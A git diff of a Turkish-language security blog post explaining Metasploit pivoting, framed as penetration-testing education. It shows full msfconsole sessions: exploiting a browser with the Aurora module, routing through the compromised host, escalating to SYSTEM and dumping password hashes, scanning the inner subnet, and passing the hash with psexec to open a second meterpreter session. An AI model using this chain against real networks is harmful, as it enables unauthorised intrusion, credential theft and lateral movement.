@@ -5,7 +5,7 @@ date: 2017-05-25 09:07:06.000000000 +02:00
 type: post
 author: siberoloji
 img: metasploit.jpg
-published: false
+published: true
 status: publish
 categories:
 - Nasıl
@@ -13,17 +13,22 @@ categories:
 tags:
 - msfconsole
 - metasploit Framework
-- Metasploit Framework client exploit
-- msf client side exploit
-excerpt: Bu yazımızda, Metasplot Framework kullanarak İstemci tarafı exploit olarak
-  bir PDF dosyası oluşturmayı göreceğiz. Oluşturulan PDF, görünürde zararsız olsa
-  da içerisine zararlı kodlar gömülebilir.
+- Metasploit Framework pivoting
+- msf pivoting
+excerpt: Bir sistemde meterpreter shell oturumu açtığınızı varsayalım. Oturum açtığınız sistem, ağda bulunan ancak tam yetkili bir bilgisayar olmayabilir. Bu ilk oturum açtığınız sistemi bir sıçrama tahtası olarak kullanıp aynı ağdaki diğer bilgisayarlara erişmeye **pivoting** adı verilmektedir.
 ---
 
-Pivoting is the unique technique of using an instance (also referred to as a ‘plant’ or ‘foothold’) to be able to “move” around inside a network. Basically using the first compromise to allow and even aid in the compromise of other otherwise inaccessible systems. In this scenario we will be using it for routing traffic from a normally non-routable network.
+# Pivoting Nedir?
 
-For example, we are a pentester for Security-R-Us. You pull the company directory and decide to target a user in the target IT department. You call up the user and claim you are from a vendor and would like them to visit your website in order to download a security patch. At the URL you are pointing them to, you are running an Internet Explorer exploit.
+Bir sistemde meterpreter shell oturumu açtığınızı varsayalım. Oturum açtığınız sistem, ağda bulunan ancak tam yetkili bir bilgisayar olmayabilir. Bu ilk oturum açtığınız sistemi bir sıçrama tahtası olarak kullanıp aynı ağdaki diğer bilgisayarlara erişmeye **pivoting** adı verilmektedir. Başka bir terminolojide **kıyı başı** veya **giriş noktası** olarak isimlendirildiğine de rast gelebilirsiniz. 
 
+Normalde doğrudan erişimi bulunmayan sunucu veya ağ sistemlerine, pivoting kullanarak erişme şansınız bulunmaktadır. Aşağıda inceleyeceğimiz senaryoda, meterpreter shell açılan bir bilgisayarın ağ bağlantılarını kullanarak, başka bir bilgisayara ulaşmayı deneyeceğiz. Bunu yaparken, meterpreter'in sunduğu rotalama imkanından yararlanacağız.
+
+## 1.Bilgisayara Shell Açalım
+
+Burada kullanılan ```exploit/windows/browser/ms10_002_aurora``` modülü sayesinde, hazırlanan zararlı bir linke tıklayan şirket çalışanının bilgisayarında oturum açılmaktadır.
+
+```sh
 msf > use exploit/windows/browser/ms10_002_aurora 
 msf exploit(ms10_002_aurora) > show options
 
@@ -59,8 +64,11 @@ msf exploit(ms10_002_aurora) > exploit -j
 [*]  Local IP: http://192.168.1.101:8080/
 [*] Server started.
 msf exploit(ms10_002_aurora) >
-When the target visits our malicious URL, a meterpreter session is opened for us giving full access the the system.
+```
 
+Açılan yeni oturumu ```sessions -l``` komutuyla görebilirsiniz. Aşağıdaki listede kendi IP adresimizden ```LHOST: 192.168.1.101``` diğer hedef bilgisayara ```RHOST:192.168.1.201``` bağlantı kurulduğu görülmektedir. 
+
+```sh
 msf exploit(ms10_002_aurora) > 
 [*] Sending Internet Explorer "Aurora" Memory Corruption to client 192.168.1.201
 [*] Sending stage (749056 bytes) to 192.168.1.201
@@ -76,8 +84,13 @@ Active sessions
   1   meterpreter x86/win32  XEN-XP-SP2-BARE\Administrator @ XEN-XP-SP2-BARE  192.168.1.101:4444 -> 192.168.1.201:8777
 
 msf exploit(ms10_002_aurora) >
-When we connect to our meterpreter session, we run ipconfig and see that the exploited system is dual-homed, a common configuration amongst IT staff.
+```
 
+## 1.Bilgisayarın Ağ Kartları
+
+Şimdi bu oturuma girelim ve ```ipconfig``` komutuyla hedef bilgisayarın ağ ayarlarına bakalım. 
+
+```sh
 msf exploit(ms10_002_aurora) > sessions -i 1
 [*] Starting interaction with 1...
 
@@ -104,8 +117,32 @@ Netmask     : 255.255.255.0
 
 
 meterpreter >
-We want to leverage this newly discovered information and attack this additional network. Metasploit has an autoroute meterpreter script that will allow us to attack this second network through our first compromised machine.
+```
 
+Bizim oturum açtığımız bilgisayarın IP adresinden anlıyoruz ki bağlandığımız ağ kartı ```Citrix XenServer PV Ethernet Adapter - Packet Scheduler Miniport``` isimli karttır. 
+
+Oysa sistemde 
+
+```MS TCP Loopback interface``` ve 
+
+```Citrix XenServer PV Ethernet Adapter #2 - Packet Scheduler Miniport``` 
+
+isimli 2 kart daha var. Bunlardan ```MS TCP Loopback interface``` isimli arayüz, zaten ```localhost``` olarak kullanılan iletişim aracıdır. 
+
+O zaman, ```Citrix XenServer PV Ethernet Adapter #2 - Packet Scheduler Miniport``` isimli diğer ağ yapılandırmasına odaklanalım.
+
+```sh
+Citrix XenServer PV Ethernet Adapter #2 - Packet Scheduler Miniport
+Hardware MAC: d2:d6:70:fa:de:65
+IP Address  : 10.1.13.3
+Netmask     : 255.255.255.0
+```
+
+Bu bilgilerden anladığımız kadarıyla ```Citrix XenServer PV Ethernet Adapter #2 - Packet Scheduler Miniport``` isimli kartın IP adresi ```10.1.13.3```. O zaman bu ağa bağlananlara ```10.1.13.1-255``` aralığında IP adresleri verildiğini anlıyoruz. CIDR formatında bu ```10.1.13.0/24``` olarak gösteriliyor. 
+
+Meterpreter'in sağladığı imkanlardan bir tanesi de ```autoroute``` script kodudur. autoroute hakkında yardımı görüntüleyelim.
+
+```sh
 meterpreter > run autoroute -h
 [*] Usage:   run autoroute [-r] -s subnet -n netmask
 [*] Examples:
@@ -115,10 +152,20 @@ meterpreter > run autoroute -h
 [*]   run autoroute -p                            # Print active routing table
 [*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route
 [*] Use the "route" and "ipconfig" Meterpreter commands to learn about available routes
+```
+
+Şimdi otomatik rotalama yapalım. Bunun için aşağıdaki komutu kullanıyoruz.
+
+```sh
 meterpreter > run autoroute -s 10.1.13.0/24
 [*] Adding a route to 10.1.13.0/255.255.255.0...
 [+] Added route to 10.1.13.0/255.255.255.0 via 192.168.1.201
 [*] Use the -p option to list all active routes
+```
+
+Rotalama yapıldı. Kontrol edelim.
+
+```sh
 meterpreter > run autoroute -p
 
 Active Routing Table
@@ -129,10 +176,18 @@ Active Routing Table
    10.1.13.0          255.255.255.0      Session 1
 
 meterpreter >
-Now that we have added our additional route, we will escalate to SYSTEM, dump the password hashes, and background our meterpreter session by pressing Ctrl-z.
+```
 
+## 2.Bilgisayara Bağlantı
+
+İlk bilgisayarda ```getsystem``` komutuyla hash bilgilerini elde edelim. Bu hash bilgilerini kullanarak 2. bilgisayara bağlanmaya çalışacağız. Ağdaki bilgisayarların, hash değerleriyle yetki kontrolü yaptığını hatırlayın. Bu teknikle ilgili [Metasploit Framework Yetki Yükseltme](https://siberoloji.github.io/metaspliot-framework-yetki-yukseltme/) yazısına bakabilirsiniz.
+
+Aşağıdaki komutlarla, ```getsystem``` ile SYSTEM bilgilerini elde ediyoruz, ```hashdump``` ile hash bilgilerini alıyoruz ve ```CTRL+Z``` tuşları ile oturumu arka plana gönderiyoruz.
+
+```sh
 meterpreter > getsystem
 ...got system (via technique 1).
+
 meterpreter > run hashdump
 [*] Obtaining the boot key...
 [*] Calculating the hboot key using SYSKEY c2ec80f879c1b5dc8d2b64f1e2c37a45...
@@ -151,8 +206,13 @@ victim:1004:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
 meterpreter > 
 Background session 1? [y/N]  
 msf exploit(ms10_002_aurora) >
-Now we need to determine if there are other systems on this second network we have discovered. We will use a basic TCP port scanner to look for ports 139 and 445.
+```
 
+## 2.Bilgisayar Ağını Tarama
+
+Rotalama sayesinde artık 2. bilgisayar ağı ile haberleşebiliyoruz. O zaman bu ağı tarayalım ve ```139``` ile ```445``` numaralı portları açık olup olmadığına bakalım. İsterseniz tüm portları da tarayabilirsiniz. Biz sadece örnek vermek için bu iki portu tarayacağız. Bu tarama işlemi için ```auxiliary/scanner/portscan/tcp``` modülünü kullanacağız. Modülde RHOSTS değişkenini ```RHOSTS 10.1.13.0/24``` olarak ayarladığımıza dikkat edin.
+
+```sh
 msf exploit(ms10_002_aurora) > use auxiliary/scanner/portscan/tcp 
 msf auxiliary(tcp) > show options
 
@@ -186,8 +246,15 @@ msf auxiliary(tcp) > run
 [*] Scanned 256 of 256 hosts (100% complete)
 [*] Auxiliary module execution completed
 msf auxiliary(tcp) >
-We have discovered an additional machine on this network with ports 139 and 445 open so we will try to re-use our gathered password hash with the psexec exploit module. Since many companies use imaging software, the local Administrator password is frequently the same across the entire enterprise.
+```
 
+Yapılan tarama sonucunda ```10.1.13.2``` ve ```10.1.13.3``` olarak 2 IP adresi bulduk. Bunlardan ```10.1.13.3``` IP adresi zaten bizim 1. bilgisayara ait olduğundan ```10.1.13.2``` IP adresine odaklanacağız.
+
+## Bağlantı Yapalım
+
+445 numaralı portun ```samba``` ağ paylaşım işlemlerinden kullanıldığını biliyoruz. Öyleyse, ```exploit/windows/smb/psexec``` modülünü kullanabiliriz. Modül ayarlarını yaparken, ilk bilgisayardan elde ettiğimiz ```Administrator:500:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d``` hash değerlerini girdiğimize dikkat edin.
+
+```sh
 msf auxiliary(tcp) > use exploit/windows/smb/psexec 
 msf exploit(psexec) > show options
 
@@ -211,12 +278,16 @@ Exploit target:
 
 msf exploit(psexec) > set RHOST 10.1.13.2
 RHOST => 10.1.13.2
+
 msf exploit(psexec) > set SMBUser Administrator
 SMBUser => Administrator
+
 msf exploit(psexec) > set SMBPass 81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d
 SMBPass => 81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d
+
 msf exploit(psexec) > set PAYLOAD windows/meterpreter/bind_tcp
 PAYLOAD => windows/meterpreter/bind_tcp
+
 msf exploit(psexec) > exploit
 
 [*] Connecting to the server...
@@ -238,8 +309,19 @@ msf exploit(psexec) > exploit
 [*] Meterpreter session 2 opened (192.168.1.101-192.168.1.201:0 -> 10.1.13.2:4444) at Mon Dec 06 08:56:42 -0700 2010
 
 meterpreter >
-Our attack has been successful! You can see in the above output that we have a meterpreter session connecting to 10.1.13.2 via our existing meterpreter session with 192.168.1.201. Running ipconfig on our newly compromised machine shows that we have reached a system that is not normally accessible to us.
+```
 
+Gördüğünüz gibi 2. bilgisayara bağlantı sağladık. Bu bağlantıyı yukarıda ```[*] Meterpreter session 2 opened (192.168.1.101-192.168.1.201:0 -> 10.1.13.2:4444)``` satırından da görebileceğiniz gibi ```192.168.1.101-192.168.1.201:0 -> 10.1.13.2:4444``` rotasını takip ederek yaptık.
+
+192.168.1.101: Kendi bilgisayarımız
+
+192.168.1.201: Pivot olarak kullanılan bilgisayar
+
+10.1.13.2: Erişim sağlanan 2. bilgisayar.
+
+İkinci bilgisayarın ```ipconfig``` ayarlarına bakalım.
+
+```sh
 meterpreter > ipconfig
 
 Citrix XenServer PV Ethernet Adapter
@@ -256,4 +338,10 @@ Netmask     : 255.0.0.0
 
 
 meterpreter >
-As you can see, pivoting is an extremely powerful feature and is a critical capability to have on penetration tests.
+```
+
+Görüldüğü gibi **pivoting** çok güçlü bir tekniktir. Bir ağda, herhangi bir bilgisayara erişim sağladıktan sonra, ağdaki diğer sistemlere ulaşmanızda size yardımcı olmaktadır. 
+
+AĞ YÖNETİCİLERİNE HATIRLATMA:
+
+> Zincir, en zayıf halkası kadar güçlüdür.
